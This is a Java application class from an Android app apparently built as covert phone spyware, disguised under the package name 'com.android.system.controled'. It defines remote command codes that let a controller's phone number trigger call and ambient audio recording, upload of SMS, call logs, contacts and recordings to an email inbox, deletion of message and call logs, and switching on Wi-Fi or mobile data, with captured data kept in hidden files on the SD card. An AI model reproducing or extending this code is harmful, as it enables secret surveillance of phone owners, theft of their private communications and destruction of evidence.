package com.android.system.controled;

import java.io.File;

import android.app.Application;
import android.os.Environment;

import com.android.system.controled.util.InitUtil;
import com.android.system.controled.util.StringUtil;

public class MainApplication extends Application {

	private static final String TAG = "MainApplication";

	private String controllerTel = "";// 控制者的电话号码
	/**
	 * 发送者的email和密码，163邮箱
	 */
	private String senderEmailAddr = "";
	private String senderPwd = "";

	/**
	 * 接收者的email
	 */
	private String receiverEmailAddr = "";

	public static final String PHONE_CODE_UP = "zgy_011";// TURN_UP
	public static final String PHONE_CODE_DOWN = "zgy_012";// TURN_DOWN
	public static final String PHONE_CODE_CALL_ME = "zgy_013";// CALL_ME

	public static final String PHONE_CODE_RECORD_TIME = "zgy_015:";// RECORD_TIME:
	public static final String PHONE_CODE_RECORD_START = "zgy_016";// RECORD_START
	public static final String PHONE_CODE_RECORD_END = "zgy_017";// RECORD_END

	public static final String PHONE_CODE_DELETE_MSG_LOG = "zgy_021";// DEL_MSG
	public static final String PHONE_CODE_DELETE_CALL_LOG = "zgy_022";// DEL_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "zgy_023";// DEL_AUDIO_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "zgy_025";// DEL_AUDIO_OTHER
	public static final String PHONE_CODE_DELETE_ALL_LOG = "zgy_026";// DEL_ALL

	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "zgy_031";// HELLO_SMS_CALL
	public static final String PHONE_CODE_UPLOAD_ALL = "zgy_032";// HELLO_ALL
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "zgy_033";// HELLO_CALL_AUDIO
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "zgy_035";// HELLO_OTHER_AUDIO
	public static final String PHONE_CODE_UPLOAD_CONTACTS = "zgy_036";// HELLO_CONTACTS

	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "zgy_031M";// HELLO_SMS_CALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "zgy_032M";// HELLO_ALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "zgy_033M";// HELLO_CALL_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "zgy_035M";// HELLO_OTHER_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "zgy_036M";// HELLO_CONTACTS_MOBILE

	public static final String PHONE_CODE_TURNON_WIFI = "zgy_057";// TURN_ON_WIFI
	public static final String PHONE_CODE_TURNON_MOBILE = "zgy_056";// TURN_ON_MOBILE

	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";

	public static final String FILE_IN_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";

	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + ".androidcall.txt");
	public static final File FILE_CONTACTS = new File(FILE_IN_SDCARD + ".contacts.txt");
	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";

	private static MainApplication instence;

	public static MainApplication getInstence() {
		return instence;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		instence = this;
		Debug.e("", "==============Application   IS onCreate=======================");
		InitUtil.init(this);
		InitUtil.initConfig(this);
	}

	@Override
	public void onTerminate() {
		Debug.e("", "==============Application   IS onTerminate=======================");
		super.onTerminate();
	}

	public String getControllerTel() {
		if (StringUtil.isNull(controllerTel))
			InitUtil.initConfig(instence);
		return controllerTel;
	}

	public void setControllerTel(String controllerTel) {
		this.controllerTel = controllerTel;
	}

	public String getSenderEmailAddr() {
		if (StringUtil.isNull(senderEmailAddr))
			InitUtil.initConfig(instence);
		return senderEmailAddr;
	}

	public void setSenderEmailAddr(String senderEmailAddr) {
		this.senderEmailAddr = senderEmailAddr;
	}

	public String getSenderPwd() {
		if (StringUtil.isNull(senderPwd))
			InitUtil.initConfig(instence);
		return senderPwd;
	}

	public void setSenderPwd(String senderPwd) {
		this.senderPwd = senderPwd;
	}

	public String getReceiverEmailAddr() {
		if (StringUtil.isNull(receiverEmailAddr))
			InitUtil.initConfig(instence);
		return receiverEmailAddr;
	}

	public void setReceiverEmailAddr(String receiverEmailAddr) {
		this.receiverEmailAddr = receiverEmailAddr;
	}
}
